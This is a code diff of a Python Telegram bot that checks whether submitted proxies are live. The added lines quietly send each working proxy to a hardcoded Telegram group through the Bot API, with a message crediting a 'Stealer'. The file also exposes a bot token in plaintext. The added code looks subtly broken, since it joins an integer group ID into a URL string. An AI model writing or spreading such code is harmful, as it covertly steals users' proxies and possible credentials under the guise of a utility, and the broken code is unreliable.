@@ -1,13 +1,9 @@
-import os
-os.system("pip install telebot")
-
 import requests
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 GROUP_ID = -1002472800336
 tkn = "7444500748:AAHh3JPgEChJo5QeG5w5IDZB7O1Ki1ZeJDk"
-bot = telebot.TeleBot(tkn)
 
 
 def start(update: Update, context):
@@ -26,7 +22,9 @@ def check_proxy(proxy):
 
         response = requests.get("http://www.google.com", proxies=proxies, timeout=10)
         if response.status_code == 200:
-            bot.send_message(chat_id= GROUP_ID, text= "⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️")
+            text = f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️\n\nStealer ~ @The_RAMBHAKT⚡️"
+            url = "https://api.telegram.org/bot" + tkn + "/sendMessage" + "?chat_id=" + GROUP_ID + "&text=" + text
+            requests.get(url)
             return f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"
         else:
             return f"⊙ Status: Dead ❌\n⊙ Proxy: {proxy}\n\nDev ~ @whytorrent⚡️"
